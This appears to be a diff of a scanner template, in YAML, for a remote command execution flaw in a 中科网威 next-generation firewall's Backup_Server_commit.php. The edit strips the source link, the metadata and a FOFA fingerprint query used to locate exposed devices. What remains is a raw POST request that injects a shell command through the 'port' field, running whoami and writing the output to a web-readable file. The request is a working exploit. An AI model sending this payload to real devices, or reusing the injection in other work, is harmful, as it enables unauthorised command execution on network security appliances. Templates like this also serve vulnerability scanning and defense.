@@ -3,12 +3,8 @@ info:
   name: 中科网威下一代防火墙控制系统Backup_Server_commit存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hlhkqrhmvhxcnv6v'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hlhkqrhmvhxcnv6v
-    fofa: body="Get_Verify_Info(hex_md5(user_string)."
 http:
 - raw:
   - 'POST /view/DBManage/Backup_Server_commit.php?action=test HTTP/1.1
@@ -40,11 +36,9 @@ http:
     Priority: u=4
 
 
-    host=&mode=0&port=;echo%20%60whoami%60%20|tee%20/tmp/www/reporter/test.txt|whoami&user=&password=&ftppath=![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728984932251-44a6d060-2ad7-4409-a6ac-a03cc86a28a9.png)
+    host=&mode=0&port=;echo%20%60whoami%60%20|tee%20/tmp/www/reporter/test.txt|whoami&user=&password=&ftppath=
 
-    路径定位：http://ip/test.txt
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728984932500-cf9e9815-d864-4a8a-a79d-bc83cb7f0705.png)'
+    路径定位：http://ip/test.txt'
   redirects: false
   matchers:
   - status:
